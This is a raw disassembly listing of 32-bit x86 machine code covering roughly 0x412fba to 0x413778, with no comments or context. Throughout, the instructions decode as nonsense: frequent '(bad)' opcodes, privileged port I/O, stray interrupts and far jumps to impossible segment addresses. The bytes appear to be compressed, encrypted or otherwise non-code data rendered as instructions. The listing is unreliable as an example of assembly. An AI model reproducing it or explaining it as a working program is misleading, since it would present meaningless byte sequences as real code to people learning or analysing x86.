  412fba:	ja     0x412fb8
  412fbc:	sbb    DWORD PTR [bp+di],edi
  412fbf:	jbe    0x412ff9
  412fc1:	cmc    
  412fc2:	xchg   edx,eax
  412fc3:	add    bh,dl
  412fc5:	jno    0x412f6c
  412fc7:	adc    al,0x1d
  412fc9:	or     eax,0x4fbaaa77
  412fce:	mov    eax,ds:0x3c3acb40
  412fd3:	lods   eax,DWORD PTR ds:[esi]
  412fd4:	jo     0x412fe8
  412fd6:	push   0xd3fd2747
  412fdb:	pushf  
  412fdc:	inc    edx
  412fdd:	pusha  
  412fde:	(bad)  
  412fdf:	iret   
  412fe0:	outs   dx,BYTE PTR ds:[esi]
  412fe1:	pop    ebx
  412fe2:	mov    al,0xd8
  412fe4:	xor    ecx,DWORD PTR ds:0x2954793
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	inc    ecx
  412fec:	retf   0xb49a
  412fef:	sub    DWORD PTR [edx],ecx
  412ff1:	arpl   WORD PTR [ecx-0x6],si
  412ff4:	add    edx,DWORD PTR [ecx]
  412ff6:	mov    DWORD PTR [esp+esi*2-0x337125c9],esp
  412ffd:	mov    al,ds:0x7df833d1
  413002:	xchg   edi,eax
  413003:	pop    ebx
  413004:	pop    esp
  413005:	fild   WORD PTR [eax]
  413007:	mov    ds:0xd74b5e0e,eax
  41300c:	clc    
  41300d:	jae    0x413063
  41300f:	pop    edx
  413010:	mov    ebp,DWORD PTR [edx-0x7c134f5]
  413016:	cmp    esp,DWORD PTR [ecx-0x52]
  413019:	or     DWORD PTR [ecx],edi
  41301b:	or     al,0x30
  41301d:	jge    0x413096
  41301f:	and    DWORD PTR [ebx],ecx
  413021:	(bad)  
  413022:	mov    al,ds:0x4e04f1c
  413027:	jmp    0xd9aa:0x501885bf
  41302e:	add    DWORD PTR [edx-0x71b79b1e],ecx
  413034:	inc    DWORD PTR [esi+0x1e]
  413037:	imul   esi,DWORD PTR [edx-0x20],0x1be71fbd
  41303e:	jns    0x412ffb
  413040:	addr16 pop esp
  413042:	jno    0x412ff9
  413044:	jg     0x413016
  413046:	nop
  413047:	jl     0x412ffd
  413049:	and    eax,0xc5857945
  41304e:	push   ebx
  41304f:	fisub  DWORD PTR [ebx-0x13da5557]
  413055:	mov    ch,BYTE PTR [ecx]
  413057:	pop    ebp
  413058:	mov    al,ds:0x412beb7c
  41305d:	out    dx,al
  41305e:	pop    edx
  41305f:	push   esi
  413060:	stos   DWORD PTR es:[edi],eax
  413061:	lods   eax,DWORD PTR ds:[esi]
  413062:	jb     0x412fe8
  413064:	dec    esi
  413065:	jno    0x41303d
  413067:	mov    bh,0x73
  413069:	pop    edx
  41306a:	add    dh,BYTE PTR [ecx+edx*2+0x1fb1fa3e]
  413071:	iret   
  413072:	sar    BYTE PTR [eax-0x23c7c3d7],cl
  413078:	sub    DWORD PTR [ebx],ebx
  41307a:	stos   BYTE PTR es:[edi],al
  41307b:	test   DWORD PTR [edi-0x79],eax
  41307e:	inc    esp
  41307f:	mov    WORD PTR [eax+0x7ea834d7],ds
  413085:	stc    
  413086:	ins    BYTE PTR es:[edi],dx
  413087:	lahf   
  413088:	jle    0x413011
  41308a:	mov    ebp,esp
  41308c:	add    bl,al
  41308e:	push   cs
  41308f:	sahf   
  413090:	dec    ebp
  413091:	aas    
  413092:	mov    ds:0xf32255cc,al
  413097:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  413099:	xchg   BYTE PTR [esi+0x4b],al
  41309c:	or     dl,ch
  41309e:	cmc    
  41309f:	es cli 
  4130a1:	cmc    
  4130a2:	sbb    edx,DWORD PTR [edx-0x45]
  4130a5:	dec    esi
  4130a6:	sub    bl,BYTE PTR [esi]
  4130a8:	stc    
  4130a9:	dec    ebp
  4130aa:	nop
  4130ab:	push   edi
  4130ac:	scas   eax,DWORD PTR es:[edi]
  4130ad:	or     al,0x22
  4130af:	imul   ecx,ebx,0xe6a54feb
  4130b5:	in     eax,dx
  4130b6:	inc    esp
  4130b7:	mov    dh,0x96
  4130b9:	jecxz  0x41303c
  4130bb:	mov    bh,0x3a
  4130bd:	inc    esi
  4130be:	jno    0x4130fc
  4130c0:	es std 
  4130c2:	je     0x41306a
  4130c4:	stos   BYTE PTR es:[edi],al
  4130c5:	int3   
  4130c6:	push   eax
  4130c7:	mov    ch,0x94
  4130c9:	xchg   edi,eax
  4130ca:	lods   eax,DWORD PTR ds:[esi]
  4130cb:	cli    
  4130cc:	pop    es
  4130cd:	ret    0x81b1
  4130d0:	push   esi
  4130d1:	mov    ds:0x3c20ef85,eax
  4130d6:	sbb    al,BYTE PTR [edi-0x270e750b]
  4130dc:	js     0x4130e8
  4130de:	sbb    esp,DWORD PTR [ebx-0x14b7e48d]
  4130e4:	xchg   esp,eax
  4130e5:	lea    edi,[ebx]
  4130e7:	mov    esp,0x260e3506
  4130ec:	test   eax,0x2c82659b
  4130f1:	out    dx,eax
  4130f2:	add    ecx,DWORD PTR [edx-0x1a]
  4130f5:	aad    0xec
  4130f7:	pop    ss
  4130f8:	sub    BYTE PTR [esi+0x461316f1],0x55
  4130ff:	aas    
  413100:	add    al,0xdc
  413102:	inc    esi
  413103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413104:	sti    
  413105:	sbb    dl,BYTE PTR [esi+edx*1]
  413108:	cs push ebp
  41310a:	push   0x50
  41310c:	sub    DWORD PTR [edi],0xffffff98
  41310f:	mov    ecx,0x8d003dcd
  413114:	push   ss
  413115:	nop
  413116:	mov    dl,0xf4
  413118:	mov    esi,0xe20d162e
  41311d:	scas   al,BYTE PTR es:[edi]
  41311e:	xchg   ebp,eax
  41311f:	add    cl,BYTE PTR [ecx-0x2b]
  413122:	shr    DWORD PTR [eax+0x46],1
  413125:	fist   DWORD PTR [ebp+0x11]
  413128:	cmp    DWORD PTR [ebp+0x715f6ce8],ebx
  41312e:	pop    ss
  41312f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413130:	pushf  
  413131:	jle    0x41314f
  413133:	mov    dh,0xc7
  413135:	adc    al,0x68
  413137:	xchg   edi,eax
  413138:	jmp    0x3595:0xc3de18b7
  41313f:	sbb    ah,bh
  413141:	shr    BYTE PTR [edi],cl
  413143:	sub    BYTE PTR [esi-0x2e],ah
  413146:	cs ss inc edx
  413149:	rcr    DWORD PTR [ebx+0x1ad01e99],0x87
  413150:	loopne 0x4131bf
  413152:	pop    ebp
  413153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413154:	pop    ss
  413155:	sbb    dh,BYTE PTR [ebx]
  413157:	inc    esp
  413158:	(bad)  
  413159:	loope  0x413184
  41315b:	push   eax
  41315c:	cli    
  41315d:	test   BYTE PTR [edi-0x309576cb],bl
  413163:	inc    edi
  413164:	pop    ebx
  413165:	retf   
  413166:	push   es
  413167:	jae    0x41319a
  413169:	jb     0x413191
  41316b:	inc    ebx
  41316c:	outs   dx,BYTE PTR ds:[esi]
  41316d:	push   esi
  41316e:	outs   dx,BYTE PTR ds:[esi]
  41316f:	or     eax,0xe1817e77
  413174:	pop    eax
  413175:	cmc    
  413176:	mov    ch,0xb8
  413178:	leave  
  413179:	mov    es,WORD PTR [eax+0x6]
  41317c:	mov    eax,ds:0x9fa995f3
  413181:	retf   
  413182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413183:	lods   eax,DWORD PTR ds:[esi]
  413184:	sbb    esp,DWORD PTR [ebp-0x39c8cad9]
  41318a:	(bad)
  41318f:	js     0x4131e9
  413191:	jecxz  0x4131e8
  413193:	repnz sbb al,0x14
  413196:	mov    eax,0x80596a86
  41319b:	mov    edx,0x7c98b3bc
  4131a0:	mov    cl,0x9d
  4131a2:	xor    DWORD PTR [edx-0x30],edx
  4131a5:	clc    
  4131a6:	and    al,BYTE PTR [ebx]
  4131a8:	inc    esp
  4131a9:	mov    dh,BYTE PTR [ebp-0x50c63f86]
  4131af:	loop   0x413188
  4131b1:	stos   BYTE PTR es:[edi],al
  4131b2:	fs lahf 
  4131b4:	fnsave [esp+ebp*2-0x42]
  4131b8:	and    BYTE PTR [ecx],dh
  4131ba:	adc    al,0xc9
  4131bc:	(bad)  
  4131be:	sbb    BYTE PTR [ecx],0x2a
  4131c1:	xor    ebp,DWORD PTR [esi-0x46d4161c]
  4131c7:	scas   eax,DWORD PTR es:[edi]
  4131c8:	sahf   
  4131c9:	inc    ebp
  4131ca:	dec    esi
  4131cb:	xchg   ebp,eax
  4131cc:	jmp    0x16cfaf32
  4131d1:	adc    eax,0x1c6cdd2c
  4131d6:	mov    WORD PTR [esi+ebp*2],gs
  4131d9:	and    al,0xf8
  4131db:	pushf  
  4131dc:	push   ebx
  4131dd:	ret    0xa15c
  4131e0:	test   BYTE PTR [eax+edx*1-0x444c5fa4],ch
  4131e7:	adc    eax,0xeb760ee5
  4131ec:	push   ebp
  4131ed:	pop    eax
  4131ee:	in     al,0x3e
  4131f0:	aam    0x42
  4131f2:	sar    ch,cl
  4131f4:	(bad)  
  4131f5:	addr16 inc esp
  4131f7:	rol    BYTE PTR ds:0xfdd3032e,cl
  4131fd:	dec    esp
  4131fe:	jbe    0x413197
  413200:	fcom   QWORD PTR [eax+0x24]
  413203:	mov    WORD PTR [ebx+0x4f],es
  413206:	mov    bl,0x98
  413208:	inc    ebp
  413209:	shl    dl,cl
  41320b:	mov    dl,0x16
  41320d:	sbb    al,0x2
  41320f:	jmp    0xea7d4931
  413214:	loop   0x41324e
  413216:	cmp    dh,bh
  413218:	out    dx,eax
  413219:	ret    0xaf28
  41321c:	xchg   ebp,eax
  41321d:	mov    al,0x3b
  41321f:	or     al,0xda
  413221:	fdivrp st(1),st
  413223:	(bad)  
  413224:	(bad)  
  413225:	push   cs
  413226:	or     eax,DWORD PTR [ecx]
  413228:	shl    BYTE PTR [ebx+0x54],1
  41322b:	push   edi
  41322c:	iret   
  41322d:	fwait
  41322e:	inc    esi
  41322f:	sub    ecx,DWORD PTR [eax+0x535a6bb]
  413235:	nop
  413236:	or     bh,BYTE PTR [ebx]
  413238:	sti    
  413239:	pop    eax
  41323a:	ss cwde 
  41323c:	and    dh,al
  41323e:	inc    ebx
  41323f:	ja     0x41323b
  413241:	int3   
  413242:	push   edi
  413243:	xchg   ebx,eax
  413244:	fnstsw ax
  413246:	or     eax,DWORD PTR [ebx]
  413248:	lods   al,BYTE PTR ds:[esi]
  413249:	imul   eax,DWORD PTR [ecx],0x2d7fba58
  41324f:	dec    eax
  413250:	mov    dl,0xd2
  413252:	gs add eax,0x835b93a1
  413258:	xchg   edi,eax
  413259:	cmp    BYTE PTR [ebx],ah
  41325b:	mov    bl,0x6
  41325d:	in     al,dx
  41325e:	mov    bl,0xac
  413260:	(bad)  
  413261:	popf   
  413262:	lahf   
  413263:	add    ebp,edx
  413265:	dec    esp
  413266:	loope  0x4132dc
  413268:	mov    esi,0x16641944
  41326d:	out    dx,al
  41326e:	call   0x995a:0xbcac8d49
  413275:	call   DWORD PTR [edi]
  413277:	push   ecx
  413278:	aas    
  413279:	div    DWORD PTR [ecx+0x2da681df]
  41327f:	mov    ebx,0xcafe9ed4
  413284:	lods   al,BYTE PTR ds:[esi]
  413285:	mov    bl,0x50
  413287:	shl    DWORD PTR [esi+0x28774df8],0x93
  41328e:	xor    DWORD PTR [ebx+0xd13804c],0x2a
  413295:	and    al,0xaa
  413297:	nop
  413298:	adc    al,0x16
  41329a:	imul   esi,DWORD PTR [ecx],0x54a9d3ef
  4132a0:	bound  esp,QWORD PTR [ebx-0x2b454505]
  4132a6:	dec    ebx
  4132a7:	into   
  4132a8:	xlat   BYTE PTR ds:[ebx]
  4132a9:	mov    ds,ebx
  4132ab:	imul   eax,DWORD PTR [edi],0xffffffd0
  4132ae:	xchg   DWORD PTR [edx+0x4b],ecx
  4132b1:	cmc    
  4132b2:	lds    esi,FWORD PTR [ebx-0x68]
  4132b5:	jmp    0x914c7151
  4132ba:	sbb    ecx,DWORD PTR [ebp+0x49]
  4132bd:	mov    ch,BYTE PTR [ebx]
  4132bf:	into   
  4132c0:	xchg   esi,eax
  4132c1:	cmp    DWORD PTR [edx],esp
  4132c3:	mov    ?,WORD PTR [esi+0x39]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	push   eax
  4132c8:	int    0x67
  4132ca:	ins    DWORD PTR es:[edi],dx
  4132cb:	mov    ebp,0x5ca62c3b
  4132d0:	ss sar ch,cl
  4132d3:	arpl   dx,dx
  4132d5:	inc    edx
  4132d6:	push   edi
  4132d7:	ficom  DWORD PTR [eax+0x2f]
  4132da:	push   cs
  4132db:	xor    DWORD PTR [edx+eiz*1],0x86a52738
  4132e2:	out    0xb2,al
  4132e4:	shl    DWORD PTR [ebx-0x4e],1
  4132e7:	test   eax,0xdc4a90f1
  4132ec:	cmp    BYTE PTR [edx],bh
  4132ee:	popa   
  4132ef:	add    eax,0x8a834c36
  4132f4:	jmp    0x41330d
  4132f6:	clc    
  4132f7:	xor    eax,0xf4099908
  4132fc:	push   eax
  4132fd:	mov    al,ds:0xbe03062
  413302:	xor    eax,0x98fa0ed7
  413307:	sar    BYTE PTR [ecx+0x4e1c2b79],1
  41330d:	stos   BYTE PTR es:[edi],al
  41330e:	lods   al,BYTE PTR ds:[esi]
  41330f:	dec    edi
  413310:	cmp    eax,DWORD PTR [ebx+0x2ff5721d]
  413316:	or     esi,eax
  413318:	mov    ecx,0xd97a643e
  41331d:	je     0x4132b1
  41331f:	jl     0x413387
  413321:	fdivr  QWORD PTR [ecx-0x27b3d759]
  413327:	cmp    bh,BYTE PTR [ebx+0x3694c426]
  41332d:	dec    eax
  41332e:	xchg   esi,eax
  41332f:	xor    ah,BYTE PTR [ecx]
  413331:	repnz les esi,FWORD PTR [eax+0x18cb2202]
  413338:	sub    BYTE PTR [ebx],dl
  41333a:	scas   al,BYTE PTR es:[edi]
  41333b:	sbb    BYTE PTR [ecx+0x5a],dh
  41333e:	imul   eax,esp,0x0
  413341:	popa   
  413342:	jb     0x413396
  413344:	fbstp  TBYTE PTR gs:[edx-0x7f]
  413348:	(bad)  
  413349:	cmp    bh,BYTE PTR [esi+0x34aedac]
  41334f:	xlat   BYTE PTR ds:[ebx]
  413350:	out    dx,eax
  413351:	es pop ebx
  413353:	dec    ecx
  413354:	stos   BYTE PTR es:[edi],al
  413355:	xchg   esi,eax
  413356:	int3   
  413357:	inc    ebp
  413358:	and    ecx,ebx
  41335a:	pop    esi
  41335b:	adc    bh,0xa8
  41335e:	les    eax,FWORD PTR [ebx+0x6d6217c5]
  413364:	imul   ecx,DWORD PTR [edx-0x26ba7ba9],0x789a6469
  41336e:	mov    edx,0xbe29aeb4
  413373:	fcom   st(3)
  413375:	cmp    al,0xb7
  413377:	in     al,dx
  413378:	add    eax,0xf12ac7c2
  41337d:	pop    edi
  41337e:	loop   0x413332
  413380:	inc    ebx
  413381:	mov    eax,ebx
  413383:	mov    ah,0x4
  413385:	push   ds
  413386:	(bad)  
  413387:	out    dx,eax
  413388:	push   es
  413389:	xchg   edx,eax
  41338a:	mov    ecx,0x92cf8029
  41338f:	or     ah,BYTE PTR [edx+eax*4-0x1a46ba39]
  413396:	(bad)  
  413397:	jmp    0x41336c
  413399:	add    BYTE PTR [eax],cl
  41339b:	jae    0x41334f
  41339d:	lea    ebx,[ecx]
  41339f:	shl    ch,cl
  4133a1:	arpl   WORD PTR [ebx],dx
  4133a3:	xchg   DWORD PTR [edi-0x7c],edi
  4133a6:	pop    ss
  4133a7:	mov    eax,0x46f90c0c
  4133ac:	adc    BYTE PTR [ecx-0x11f13c39],0xf8
  4133b3:	xor    eax,0x378394d4
  4133b8:	aas    
  4133b9:	mov    ecx,0x586b2818
  4133be:	aad    0xbd
  4133c0:	iret   
  4133c1:	push   es
  4133c2:	xor    BYTE PTR [edi],bl
  4133c4:	in     al,dx
  4133c5:	idiv   BYTE PTR [edi-0x4f]
  4133c8:	push   ecx
  4133c9:	loope  0x413420
  4133cb:	fs hlt 
  4133cd:	inc    edi
  4133ce:	xor    eax,0x90a5e6ff
  4133d3:	(bad)  
  4133d4:	in     al,0x82
  4133d6:	and    DWORD PTR [edx],ecx
  4133d8:	daa    
  4133d9:	pop    ecx
  4133da:	sub    cl,BYTE PTR [ebx]
  4133dc:	dec    esi
  4133dd:	scas   eax,DWORD PTR es:[edi]
  4133de:	jns    0x41336d
  4133e0:	jge    0x413388
  4133e2:	pop    ecx
  4133e3:	in     al,dx
  4133e4:	icebp  
  4133e5:	and    BYTE PTR [eax-0x80],ch
  4133e8:	pop    eax
  4133e9:	jae    0x4133d1
  4133eb:	fs inc ebx
  4133ed:	cmp    BYTE PTR [edx+0x7834c766],0xe3
  4133f4:	mov    eax,0x4adc1d77
  4133f9:	gs sub esi,esi
  4133fc:	(bad)  
  4133fd:	jmp    0xf61e2527
  413402:	rcl    DWORD PTR [edi-0x763557f],1
  413408:	sbb    al,0xdf
  41340a:	(bad)  
  41340b:	pop    ebp
  41340c:	mov    dl,0x9
  41340e:	add    eax,0x419e3389
  413413:	jno    0x413403
  413415:	push   ecx
  413416:	inc    edx
  413417:	jne    0x413467
  413419:	sub    DWORD PTR [esi],esi
  41341b:	pop    edx
  41341c:	pop    ecx
  41341d:	jge    0x413408
  41341f:	scas   al,BYTE PTR es:[edi]
  413420:	xor    dh,ch
  413422:	aaa    
  413423:	popf   
  413424:	jle    0x4133ca
  413426:	das    
  413427:	xchg   ebp,eax
  413428:	lods   eax,DWORD PTR ds:[esi]
  413429:	es and ebp,edx
  41342c:	mov    eax,ds:0xb53f5b36
  413431:	mov    bl,0x61
  413433:	jmp    0xc3d3:0x97044001
  41343a:	xor    al,BYTE PTR [eax]
  41343c:	dec    esi
  41343d:	add    BYTE PTR [ecx-0x306b957b],0xde
  413444:	cmp    al,0xb1
  413446:	call   0x4c2e:0x6640ae3b
  41344d:	je     0x413441
  41344f:	les    edx,FWORD PTR [ecx-0x1b562896]
  413455:	cwde   
  413456:	scas   al,BYTE PTR es:[edi]
  413457:	stos   BYTE PTR es:[edi],al
  413458:	daa    
  413459:	or     ah,al
  41345b:	dec    esp
  41345c:	jns    0x41341b
  41345e:	mov    cl,0xd8
  413460:	sbb    esi,DWORD PTR [esi+0x2e1a1e05]
  413466:	xchg   BYTE PTR [eax+0x7c],al
  413469:	lods   eax,DWORD PTR ds:[esi]
  41346a:	dec    esp
  41346b:	ficomp WORD PTR [ebx+eiz*4]
  41346e:	lock jmp 0x41349d
  413471:	not    BYTE PTR [edx-0x123ad16a]
  413477:	sbb    DWORD PTR [ecx-0x30],ebx
  41347a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41347b:	cmp    DWORD PTR [edx+0x31],ecx
  41347e:	lahf   
  41347f:	or     eax,0x99660e57
  413484:	int3   
  413485:	adc    BYTE PTR [edi+0x76406eb],bh
  41348b:	add    eax,0x7e1d7c7e
  413490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413491:	mov    cl,al
  413493:	les    edx,FWORD PTR [edx-0x3a]
  413496:	(bad)  
  413497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413498:	xchg   esp,eax
  413499:	and    DWORD PTR [eax+0x57],ecx
  41349c:	mov    ebx,0xa4a3ee50
  4134a1:	mov    esi,0x64dee4a5
  4134a6:	repnz pop DWORD PTR [esp+ecx*4-0x5c]
  4134ab:	pop    es
  4134ac:	(bad)
  4134af:	add    bh,BYTE PTR [edi+edi*8]
  4134b2:	cli    
  4134b3:	sbb    al,0x7
  4134b5:	mov    ah,0x73
  4134b7:	jp     0x413445
  4134b9:	fnstsw WORD PTR [eax]
  4134bb:	adc    cl,al
  4134bd:	into   
  4134be:	das    
  4134bf:	jbe    0x4134d9
  4134c1:	lods   al,BYTE PTR ds:[esi]
  4134c2:	loop   0x41349a
  4134c4:	cli    
  4134c5:	cmp    al,BYTE PTR [ebx-0x1b]
  4134c8:	cmp    BYTE PTR [edx-0x602627e7],bh
  4134ce:	push   ss
  4134cf:	cmp    DWORD PTR [ecx+0x3b],ebx
  4134d2:	sbb    cl,bl
  4134d4:	outs   dx,DWORD PTR ds:[esi]
  4134d5:	ds std 
  4134d7:	mov    edi,0xd46f2fed
  4134dc:	adc    dl,cl
  4134de:	pop    ebx
  4134df:	jo     0x41355c
  4134e1:	xor    eax,0xfecdc302
  4134e6:	sub    eax,0xec3d7cd6
  4134eb:	dec    ecx
  4134ec:	xor    al,0x92
  4134ee:	cmp    al,0xb7
  4134f0:	loop   0x41356c
  4134f2:	cmp    esp,edx
  4134f4:	cwde   
  4134f5:	es pop edi
  4134f7:	shl    DWORD PTR [eax+0x6792c4d4],cl
  4134fd:	fnstcw WORD PTR [edi-0x45c0e6dc]
  413503:	push   0x40a30327
  413508:	xor    dh,bl
  41350a:	mov    ah,0xd
  41350c:	popa   
  41350d:	test   DWORD PTR [ebx-0x634fe55e],ebx
  413513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413514:	pop    ebp
  413515:	inc    al
  413517:	les    esi,FWORD PTR [ecx]
  413519:	jmp    0x25aab2c5
  41351e:	xchg   edx,eax
  41351f:	sti    
  413520:	ret    
  413521:	aad    0xe9
  413523:	jp     0x41355d
  413525:	cs push ecx
  413527:	mov    eax,0x7d5a54f2
  41352c:	mov    es,eax
  41352e:	xchg   DWORD PTR [ecx-0x55],ebp
  413531:	mov    al,ds:0x95def86e
  413536:	mov    al,ds:0xe1a407d
  41353b:	(bad)  
  41353c:	mov    ebp,0x3d37df6a
  413541:	or     bh,BYTE PTR [ecx]
  413543:	xchg   edx,eax
  413544:	cmp    ecx,0x997a2f5b
  41354a:	push   esi
  41354b:	fistp  QWORD PTR [ebx]
  41354d:	cmpxchg BYTE PTR [edx+edx*1-0x68],al
  413552:	xor    DWORD PTR [edx+edx*4+0x49da23a8],edx
  413559:	in     eax,dx
  41355a:	call   0xcc260424
  41355f:	in     eax,dx
  413560:	out    dx,al
  413561:	ror    ah,1
  413563:	jecxz  0x4134e5
  413565:	mov    dl,0xbe
  413567:	pop    ebx
  413568:	mov    edi,DWORD PTR [ebx-0x32e346d0]
  41356e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41356f:	xchg   edi,eax
  413570:	(bad)  
  413571:	aad    0x1d
  413573:	push   cs
  413574:	mov    bh,0xc6
  413576:	call   0xfcd2e66e
  41357b:	jo     0x413573
  41357d:	pushf  
  41357e:	ja     0x41352f
  413580:	in     al,dx
  413581:	push   edx
  413582:	outs   dx,BYTE PTR ds:[esi]
  413583:	stos   DWORD PTR es:[edi],eax
  413584:	mov    dl,0xcb
  413586:	fcom   DWORD PTR [ebx]
  413588:	jno    0x4135e0
  41358a:	shl    BYTE PTR [ecx],1
  41358c:	add    DWORD PTR [ecx+0x6bd8afbf],0xb0caf8a2
  413596:	js     0x4135a4
  413598:	retf   0xe17f
  41359b:	rcl    DWORD PTR [eax+eiz*2+0x7b3e5c5a],0xc3
  4135a3:	fist   DWORD PTR [edx+0x0]
  4135a6:	jecxz  0x4135a5
  4135a8:	pop    eax
  4135a9:	xchg   DWORD PTR [eax-0x57],edx
  4135ac:	nop
  4135ad:	das    
  4135ae:	fs mov bh,0xc4
  4135b1:	xchg   ebp,eax
  4135b2:	jb     0x41360a
  4135b4:	cmc    
  4135b5:	push   esp
  4135b6:	fld    TBYTE PTR [esi]
  4135b8:	lods   al,BYTE PTR ds:[esi]
  4135b9:	push   edi
  4135ba:	aad    0x2e
  4135bc:	jne    0x4135f1
  4135be:	pop    edx
  4135bf:	int3   
  4135c0:	in     eax,0x86
  4135c2:	jae    0x4135f9
  4135c4:	cmp    DWORD PTR [edi],0x2038e60c
  4135ca:	sub    eax,DWORD PTR [eax+0x785bf9bd]
  4135d0:	sub    esi,DWORD PTR [eax+0x4d]
  4135d3:	stc    
  4135d4:	sub    ebp,DWORD PTR [edi]
  4135d6:	add    edi,edi
  4135d8:	mov    eax,0x8268bab
  4135dd:	or     DWORD PTR ds:0xe65389fc,0x2
  4135e4:	sbb    al,0xe4
  4135e6:	jns    0x413609
  4135e8:	sub    al,0xb8
  4135ea:	or     eax,0x404ddbf8
  4135ef:	xchg   ecx,eax
  4135f0:	mov    DWORD PTR [edi+0x28],ebp
  4135f3:	jns    0x4135b9
  4135f5:	popf   
  4135f6:	dec    edi
  4135f7:	fidivr DWORD PTR [ecx-0x4e]
  4135fa:	mov    edi,0xb90114cd
  4135ff:	in     eax,0xa9
  413601:	enter  0xe476,0x56
  413605:	pop    eax
  413606:	xchg   BYTE PTR [ecx-0x77acedcb],bl
  41360c:	add    dh,bl
  41360e:	fwait
  41360f:	mov    eax,ds:0x2a9c1f7d
  413614:	arpl   WORD PTR fs:[eax+edx*8],bx
  413618:	mov    esi,0x319e30
  41361d:	mov    cl,0x8a
  41361f:	adc    al,0x97
  413621:	pop    edi
  413622:	ficom  DWORD PTR [eax]
  413624:	push   es
  413625:	xchg   edi,eax
  413626:	adc    eax,0x6964da
  41362b:	out    0xbd,eax
  41362d:	mov    cl,0x2f
  41362f:	fadd   QWORD PTR [ebp-0x1e83602f]
  413635:	(bad)  
  413636:	xchg   ebx,eax
  413637:	push   edi
  413638:	xchg   ebx,eax
  413639:	mov    WORD PTR [ecx-0x24f65539],ss
  41363f:	jb     0x413636
  413641:	(bad)  
  413642:	xor    BYTE PTR [edi+ebx*1-0x51f6c3b],bl
  413649:	mov    ebx,0x5529025f
  41364e:	or     eax,0x260f8105
  413653:	mov    ds:0x44b66bc,al
  413658:	dec    ecx
  413659:	dec    eax
  41365a:	adc    bh,bl
  41365c:	outs   dx,BYTE PTR ds:[esi]
  41365d:	adc    al,0xbf
  41365f:	test   ecx,esi
  413661:	dec    edi
  413662:	imul   edi,DWORD PTR [edx-0x51],0xffffffa6
  413666:	jg     0x4136e3
  413668:	push   eax
  413669:	xor    BYTE PTR [esi+0x3a],0x98
  41366d:	mov    eax,DWORD PTR [ebp-0x47]
  413670:	sbb    eax,0x935ecaa8
  413675:	jg     0x41360f
  413677:	cmp    al,dh
  413679:	sub    edi,DWORD PTR [ebp+0x79]
  41367c:	jns    0x4136b3
  41367e:	dec    eax
  41367f:	inc    edx
  413680:	test   eax,0xb9adba8f
  413685:	jg     0x41361c
  413687:	adc    eax,0x660c76e
  41368c:	inc    edx
  41368d:	sar    BYTE PTR [ecx],0x98
  413690:	sahf   
  413691:	add    BYTE PTR [ebp+0x356c58e3],ch
  413697:	retf   
  413698:	shl    BYTE PTR ds:0x22366f5f,1
  41369e:	aam    0x4e
  4136a0:	xchg   ebx,eax
  4136a1:	push   ds
  4136a2:	xchg   esi,eax
  4136a3:	scas   eax,DWORD PTR es:[edi]
  4136a4:	jecxz  0x41365b
  4136a6:	sbb    esi,ebx
  4136a8:	fs in  eax,0xc0
  4136ab:	or     eax,0x7089c4e6
  4136b0:	test   DWORD PTR [ecx],eax
  4136b2:	inc    edi
  4136b3:	pop    edi
  4136b4:	pop    ebx
  4136b5:	jmp    FWORD PTR [edx-0x6f96c3c1]
  4136bb:	mov    ch,BYTE PTR [esp+edi*1+0x289af221]
  4136c2:	and    ch,al
  4136c4:	div    edi
  4136c6:	jnp    0x413734
  4136c8:	cmp    esp,esi
  4136ca:	and    eax,0xc66b6f36
  4136cf:	push   edi
  4136d0:	(bad)  
  4136d1:	call   0x6df10745
  4136d6:	jmp    0xcda3:0x5abedf78
  4136dd:	daa    
  4136de:	xor    eax,0x2b134280
  4136e3:	gs jmp 0x3fc56e1a
  4136e9:	dec    eax
  4136ea:	inc    ebp
  4136eb:	inc    ebx
  4136ec:	sub    esp,edi
  4136ee:	gs scas al,BYTE PTR es:[edi]
  4136f0:	push   edx
  4136f1:	ds jmp 0x413762
  4136f4:	in     eax,0x22
  4136f6:	xor    al,0x2
  4136f8:	aam    0xf7
  4136fa:	stos   DWORD PTR es:[edi],eax
  4136fb:	into   
  4136fc:	out    dx,al
  4136fd:	or     ebp,ebp
  4136ff:	push   esp
  413700:	xchg   DWORD PTR [ecx+0x7],eax
  413703:	imul   edx,DWORD PTR [edx],0xc16e2736
  413709:	jnp    0x4136e2
  41370b:	outs   dx,DWORD PTR ds:[esi]
  41370c:	xor    eax,edx
  41370e:	jecxz  0x413730
  413710:	mov    edx,0x32a78eab
  413715:	fldenv [ebp+0x4ed6f7d1]
  41371b:	outs   dx,DWORD PTR ds:[esi]
  41371c:	int    0x7d
  41371e:	push   edx
  41371f:	shl    edi,cl
  413721:	cmp    ebx,0xffffff95
  413724:	leave  
  413725:	(bad)  [ecx+0x5e]
  413728:	mov    cs,WORD PTR [eax-0x3e]
  41372b:	dec    edi
  41372c:	mov    DWORD PTR [eax+0x7f],0x66fcb7cb
  413733:	dec    eax
  413734:	or     bl,dh
  413736:	(bad)  
  413738:	popa   
  413739:	pop    es
  41373a:	outs   dx,BYTE PTR ds:[esi]
  41373b:	jle    0x41378e
  41373d:	sti    
  41373e:	scas   eax,DWORD PTR es:[edi]
  41373f:	mov    ds:0x9f7009b2,al
  413744:	xchg   ebp,eax
  413745:	clc    
  413746:	mov    ds:0xc19fe3fe,al
  41374b:	xlat   BYTE PTR ds:[ebx]
  41374c:	dec    edi
  41374d:	into   
  41374e:	mov    bl,0x57
  413750:	adc    esp,DWORD PTR [edi+0x527760b3]
  413756:	and    eax,0x92ea20fb
  41375b:	mov    edi,0xa182e8da
  413760:	int    0x56
  413762:	imul   ebp,DWORD PTR [ebx+0x1],0x2e
  413766:	mov    BYTE PTR [ebx+0x2219eb3e],bl
  41376c:	jnp    0x4137c0
  41376e:	fadd   DWORD PTR [edx-0xf]
  413771:	adc    cl,dh
  413773:	fcom   DWORD PTR [ecx+eax*8]
  413776:	jp     0x4137f5
  413778:	call   0x49db1323
